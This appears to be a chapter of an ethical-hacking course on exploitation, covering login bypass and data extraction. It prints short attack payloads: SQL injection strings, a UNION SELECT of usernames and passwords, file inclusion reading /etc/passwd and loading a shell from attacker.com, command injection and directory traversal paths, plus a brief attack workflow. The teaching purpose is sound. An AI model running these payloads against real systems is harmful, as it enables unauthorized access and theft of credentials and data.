# 602. Exploitation Techniques

Once vulnerabilities are identified, ethical hackers attempt to exploit them to demonstrate risk and assess system resilience. This phase simulates real-world attacks and includes techniques like **bypassing logins** and **extracting sensitive data**.

> ⚠️ *Note: Exploitation should only be performed in controlled environments with full legal authorization.*

## 🔐 1. Bypassing Login Authentication

Login bypass attacks aim to access user accounts without valid credentials, usually by exploiting flaws in input validation or authentication logic.

### 🧰 Common Techniques:

#### 1.1 SQL Injection in Login Forms
- Exploits improper validation in login queries.
- Example input:
  ```sql
  ' OR '1'='1
  ```
- May allow login as administrator without password.

#### 1.2 Default Credentials
- Using factory-set usernames and passwords.
- Common in routers, IoT, or poorly secured systems.

#### 1.3 Brute Force and Dictionary Attacks
- Automated attempts to guess credentials.
- Uses precompiled wordlists (e.g., `rockyou.txt`).

#### 1.4 Session Hijacking
- Stealing valid session tokens via XSS or packet sniffing.

#### 1.5 Credential Stuffing
- Reusing leaked credentials from data breaches.

### 🛠 Tools Used:
- Hydra
- Burp Suite
- SQLMap
- Medusa
- John the Ripper

## 📂 2. Extracting Data from Vulnerable Systems

After bypassing authentication or exploiting a vulnerability, attackers often aim to **steal, exfiltrate, or view sensitive data**.

### 🧰 Techniques:

#### 2.1 Exploiting SQL Injection for Data Retrieval
- Using advanced payloads to extract DB schema and contents.
  ```sql
  UNION SELECT username, password FROM users
  ```

#### 2.2 File Inclusion Vulnerabilities (LFI/RFI)
- Local File Inclusion: `page=../../etc/passwd`
- Remote File Inclusion: `page=http://attacker.com/shell.txt`

#### 2.3 Command Injection
- Injecting OS commands via unsanitized input.
  ```bash
  ; cat /etc/passwd
  ```

#### 2.4 Directory Traversal
- Accessing restricted files by manipulating path variables.
  ```
  ../../../../windows/system32/config
  ```

#### 2.5 Exploiting Misconfigured APIs
- Unauthenticated access to sensitive endpoints.

## 🧪 Sample Workflow

1. Scan and identify login form.
2. Test for SQL injection using `' OR 1=1--`.
3. Access granted without credentials.
4. Use SQLMap to dump tables and extract user data.
5. Export or report findings securely.

## 📘 Best Practices for Ethical Hackers

- Always **document each exploit** and its impact.
- Never extract real data from production systems unless authorized.
- Use **non-destructive payloads** where possible.
- Provide **mitigation recommendations** after testing.

> ✅ *Remember: The goal is to improve security, not cause damage.*
